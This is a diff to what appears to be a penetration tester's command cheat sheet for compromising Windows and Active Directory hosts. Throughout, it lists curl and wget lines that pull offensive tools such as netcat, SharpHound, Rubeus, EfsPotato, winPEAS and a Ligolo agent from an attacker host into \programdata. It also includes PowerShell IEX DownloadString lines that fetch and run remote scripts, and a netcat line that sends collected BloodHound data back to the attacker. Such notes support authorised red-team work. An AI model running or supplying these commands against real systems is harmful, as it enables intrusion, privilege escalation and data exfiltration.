@@ -1712,13 +1712,12 @@ python3 -m http.server 139 /Upload
 impacket-smbserver share /Upload/windows
 
 -->> Transfer From Linux
+curl $MYIP/windows/nc.exe -o \programdata\nc.exe
 curl $MYIP/windows/Sharphound.exe -o \programdata\Sharphound.exe
-curl $MYIP/windows/nc.exe -o \programdata\nc.exe
-curl $MYIP/windows/nc.exe -o \programdata\nc.exe
 curl $MYIP/windows/EfsPotato.exe -o \programdata\EfsPotato.exe
+curl $MYIP/windows/Rubeus.exe -o \programdata\Rubeus.exe
 curl $MYIP/windows/PowerView.ps1 -o \programdata\PowerView.ps1
 curl $MYIP/windows/PrivescCheck.ps1 -o \programdata\PrivescCheck.ps1
-curl $MYIP/windows/Rubeus.exe -o \programdata\Rubeus.exe
 curl $MYIP/bat2exe.bat -o \programdata\bat2exe.bat
 wget $MYIP/windows/nc.exe -o \programdata\nc.exe
 copy \\$MYIP\$\nc.exe \programdata
@@ -1731,10 +1730,9 @@ rlwrap nc -lvp 80 > /Upload/bloodhound/files.zip
 
 [*] Privilege Escalation
 +---------- Priv Check ----------+
-IEX (New-Object Net.WebClient).DownloadString('http://$MYIP/whoami')
-
-+---------- Full Privesc Scan ----------+
+powershell -c "curl $MYIP/windows/winPEASofs.exe -o \programdata\winPEASofs.exe; \programdata\winPEASofs.exe"
 IEX (New-Object Net.WebClient).DownloadString('http://$MYIP/windows/PrivescCheck.ps1');Invoke-PrivescCheck
+IEX (New-Object Net.WebClient).DownloadString('http://$MYIP/whoami')
 //$MYIP/$/winPEASofs.exe > //$MYIP/$/output_winPEAS.txt
 tail -f /Upload/windows/output_winPEAS.txt
 
@@ -1743,6 +1741,9 @@ curl $MYIP/windows/Sharphound.exe -o \programdata\Sharphound.exe; \programdata\S
 curl $MYIP/windows/nc.exe -o \programdata\nc.exe
 \programdata\nc.exe $MYIP 80 < \programdata\BloodHound.zip
 rlwrap nc -lvp 80 > /Upload/bloodhound/files.zip
+
++---------- Ligolo ----------+
+curl $MYIP/windows/agent.exe -o \programdata\agent.exe
 
 +---------- Ping Sweep /24 ----------+
 //$MYIP/$/ping.bat 192.168.210.X
